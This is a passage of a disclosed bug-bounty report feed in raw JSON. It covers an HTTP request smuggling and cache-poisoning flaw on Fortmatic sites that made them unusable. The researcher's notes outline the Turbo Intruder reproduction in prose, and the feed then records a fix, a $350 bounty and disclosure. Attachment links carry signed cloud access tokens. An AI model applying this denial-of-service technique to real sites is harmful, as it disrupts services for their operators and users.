internal":false,"editable":false,"type":"Activities::Comment","message":"notes from the video, you will notice comparing the videos i made the site completely unusable \n```\nSo i made some errors coping over the request oops\nFirstly don't use intruder for this, use the turbo intruder\nWatch as a make the site totally un useable...\nwe have a cache hit woot, its hitting the amasons3 server \nnot cloudfront. the transfer encoding header\nisn't in the request but appears in anyways\ni believe it is getting appeneded during the process. \nnotice the length 1333. next we will obverse some\nweird behavior. notice the alternating behavior. when one\nrequest goes through it gets back the proper response. the\nthe next resposne gets the cached response. lets view the\n304 resposne. we got a cache hit. it also returned a split\nrequest because the F in hex is 15 its waiting for\nthe next response. and returns a bad request =)\n\nas you can see using turbo intruder and editing it \nslightly will make the site completely broken. outside\nbrowser :)\n\nnotice how it returns the 200s outside of the vm \njust a note new lines are 2 bytes long and one character is \n1 byte take that into account when testing. \n\nusing turbo intrudor completely disables the site\nmaking it a dos due to the misocnfiguration. even though\nyou have it set not to cache. the response is cached\nin the socket because it doens't know what to do with it\nwaits for the next request to push it along. \nthese are characteristics are akin to httpsmuggling cache\nposoning. If you would like i can setup a DOS we can pick a \ntime and date =]\n```","markdown_message":"\u003cp\u003enotes from the video, you will notice comparing the videos i made the site completely unusable \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eSo i made some errors coping over the request oops\nFirstly don\u0026#39;t use intruder for this, use the turbo intruder\nWatch as a make the site totally un useable...\nwe have a cache hit woot, its hitting the amasons3 server \nnot cloudfront. the transfer encoding header\nisn\u0026#39;t in the request but appears in anyways\ni believe it is getting appeneded during the process. \nnotice the length 1333. next we will obverse some\nweird behavior. notice the alternating behavior. when one\nrequest goes through it gets back the proper response. the\nthe next resposne gets the cached response. lets view the\n304 resposne. we got a cache hit. it also returned a split\nrequest because the F in hex is 15 its waiting for\nthe next response. and returns a bad request =)\n\nas you can see using turbo intruder and editing it \nslightly will make the site completely broken. outside\nbrowser :)\n\nnotice how it returns the 200s outside of the vm \njust a note new lines are 2 bytes long and one character is \n1 byte take that into account when testing. \n\nusing turbo intrudor completely disables the site\nmaking it a dos due to the misocnfiguration. even though\nyou have it set not to cache. the response is cached\nin the socket because it doens\u0026#39;t know what to do with it\nwaits for the next request to push it along. \nthese are characteristics are akin to httpsmuggling cache\nposoning. If you would like i can setup a DOS we can pick a \ntime and date =]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-12-14T16:35:48.904Z","updated_at":"2019-12-14T16:44:48.970Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":659650,"filename":"splits-test-video2.webm","type":"video/webm","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ofSkM26Qv7WZMLfx8qGWg1LA?response-content-disposition=attachment%3B%20filename%3D%22splits-test-video2.webm%22%3B%20filename%2A%3DUTF-8%27%27splits-test-video2.webm\u0026response-content-type=video%2Fwebm\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064655Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=0be6701d4739ce826c3938e726ed59e33fc2e0c4ecd67d9a8158412ee2b53133"},{"id":659642,"filename":"splits-test-video.webm","type":"video/webm","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/F2VTvKr1crNEWvRmLJKkzCj3?response-content-disposition=attachment%3B%20filename%3D%22splits-test-video.webm%22%3B%20filename%2A%3DUTF-8%27%27splits-test-video.webm\u0026response-content-type=video%2Fwebm\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064655Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=0535882a70c6580c47299147547d65f074cc210dc9b94adff239b06112b79884"}],"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6561891,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-16T19:15:34.210Z","updated_at":"2019-12-16T19:15:34.210Z","additional_data":{"old_severity":"Critical","new_severity":"Medium (6.5)","old_severity_id":584014,"new_severity_id":590290},"actor":{"username":"d9chen","cleared":false,"url":"/d9chen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6571825,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@pwny_sec yep definitely seems like as a result of the cache poisoning DOS attacks are possible. I've adjusted the severity with CVSS scoring based on the DOS vector, and will be attempting to put out a fix.","markdown_message":"\u003cp\u003e\u003ca href=\"/pwny_sec\"\u003e@pwny_sec\u003c/a\u003e yep definitely seems like as a result of the cache poisoning DOS attacks are possible. I\u0026#39;ve adjusted the severity with CVSS scoring based on the DOS vector, and will be attempting to put out a fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-17T15:54:40.102Z","updated_at":"2019-12-17T15:54:40.102Z","actor":{"username":"d9chen","cleared":false,"url":"/d9chen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6573091,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@pwny_sec we've put an attempted fix in place. Would you mind trying the exploit again on your end to verify if we are still vulnerable to the DOS attack?","markdown_message":"\u003cp\u003e\u003ca href=\"/pwny_sec\"\u003e@pwny_sec\u003c/a\u003e we\u0026#39;ve put an attempted fix in place. Would you mind trying the exploit again on your end to verify if we are still vulnerable to the DOS attack?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-17T18:37:56.631Z","updated_at":"2019-12-17T18:37:56.631Z","actor":{"username":"d9chen","cleared":false,"url":"/d9chen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6580009,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"All the fixes seem to have resolved, the cache poisoning on all of the domains. =]","markdown_message":"\u003cp\u003eAll the fixes seem to have resolved, the cache poisoning on all of the domains. =]\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-18T15:19:58.030Z","updated_at":"2019-12-18T15:20:12.023Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6580237,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for reporting the bug and working with us on the report after initial submission! Looking forward to more reports from you in the future in the program!","markdown_message":"\u003cp\u003eThanks for reporting the bug and working with us on the report after initial submission! Looking forward to more reports from you in the future in the program!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-18T15:47:59.042Z","updated_at":"2019-12-18T15:47:59.042Z","actor":{"url":"/fortmatic_inc","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EbrjQHcHizvCKJMmYojb7krJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Fortmatic Inc."}},"bounty_amount":"350.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"fortmatic_inc","collaborator":{"username":"pwny_sec","url":"/pwny_sec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6580241,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-18T15:48:35.052Z","updated_at":"2019-12-18T15:48:35.052Z","actor":{"username":"d9chen","cleared":false,"url":"/d9chen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"pwny_sec","url":"/pwny_sec"},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6580244,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003c.\u003c will i get a payout for each domain?","markdown_message":"\u003cp\u003e\u0026lt;.\u0026lt; will i get a payout for each domain?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-18T15:48:57.502Z","updated_at":"2019-12-18T15:48:57.502Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6580281,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@pwny_sec it's the same vulnerability on our end that resulted in the issue across the different domains, as a result it would be classified as duplicates.","markdown_message":"\u003cp\u003e\u003ca href=\"/pwny_sec\"\u003e@pwny_sec\u003c/a\u003e it\u0026#39;s the same vulnerability on our end that resulted in the issue across the different domains, as a result it would be classified as duplicates.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-18T15:54:39.980Z","updated_at":"2019-12-18T15:54:39.980Z","actor":{"username":"d9chen","cleared":false,"url":"/d9chen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6580301,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"awe shuckes, could they be marked as lows? so it wont affected my signal in a negative way? I could really use the money. i am essentially living off my bounty payouts. I do appreciate the payout just hopeful for a little more. thank you","markdown_message":"\u003cp\u003eawe shuckes, could they be marked as lows? so it wont affected my signal in a negative way? I could really use the money. i am essentially living off my bounty payouts. I do appreciate the payout just hopeful for a little more. thank you\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-18T15:58:00.414Z","updated_at":"2019-12-18T16:08:16.709Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6581854,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@d9chen may i discuss this bug on my blog for education? ","markdown_message":"\u003cp\u003e\u003ca href=\"/d9chen\"\u003e@d9chen\u003c/a\u003e may i discuss this bug on my blog for education? \u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-18T18:22:53.318Z","updated_at":"2019-12-18T18:22:53.318Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7403518,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @pwny_sec took a while but we will be disclosing this report publicly! Feel free to discuss it on your blog.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/pwny_sec\"\u003e@pwny_sec\u003c/a\u003e took a while but we will be disclosing this report publicly! Feel free to discuss it on your blog.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-23T18:42:14.690Z","updated_at":"2020-03-23T18:42:14.690Z","actor":{"username":"d9chen","cleared":false,"url":"/d9chen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7403768,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you for the report. Can we disclose this?","markdown_message":"\u003cp\u003eThank you for the report. Can we disclose this?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-23T19:17:26.551Z","updated_at":"2020-03-23T19:17:26.551Z","first_to_agree":true,"actor":{"username":"denzel_h1","cleared":false,"url":"/denzel_h1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/X8Yg3t8tKpgsW9aVivKi1MbD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7405561,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@denzel_h1 i think so looks good i don't see any PI =D","markdown_message":"\u003cp\u003e\u003ca href=\"/denzel_h1\"\u003e@denzel_h1\u003c/a\u003e i think so looks good i don\u0026#39;t see any PI =D\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-24T01:40:09.211Z","updated_at":"2020-03-24T01:40:09.211Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7405567,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-24T01:42:23.957Z","updated_at":"2020-03-24T01:42:23.957Z","actor":{"username":"d9chen","cleared":false,"url":"/d9chen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}